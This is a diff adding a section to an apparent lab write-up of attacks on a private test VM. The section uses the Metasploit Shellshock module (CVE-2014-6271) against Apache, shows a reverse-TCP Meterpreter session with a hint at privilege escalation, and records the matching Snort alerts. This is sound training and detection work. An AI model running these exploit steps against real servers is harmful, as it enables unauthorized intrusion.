@@ -53,3 +53,26 @@ Server username: www-data
 From the VM, we can see that the attack was detected by Snort as a priority 1 attack:
 
 [**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:43547 -> 172.28.128.3:80
+
+Identified attack 3: Apache
+
+The Nmap scan reveals an open port 80 with the HTTP service, running Apache httpd version 2.4.7. A search for Apache exploits yields a plethora of options, so we refer to Google to find multi/http/apache_mod_cgi_bash_env_exec as a potential exploit. The configuration is very straightforward, and the exploit is executed:
+
+set RHOSTS 172.28.128.3
+exploit
+
+The exploit was successful and resulted in the establishment of a Meterpreter shell:
+
+[*] Started reverse TCP handler on 192.168.0.104:4444 
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1017704 bytes) to 192.168.0.104
+[*] Meterpreter session 17 opened (192.168.0.104:4444 -> 192.168.0.104:39530) at 2023-11-20 00:04:31 +0200
+
+meterpreter > getuid
+Server username: www-data
+
+From here, we try to list the files in the current directory and a file named "hello_world.sh" is discovered. This file could potentially be executed by some service and thus be an avenue for privilege escalation.
+
+The intrusion did not go unnoticed, as Snort detected the attack and logged it:
+
+11/19-22:04:30.702047  [**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:42371 -> 172.28.128.3:80
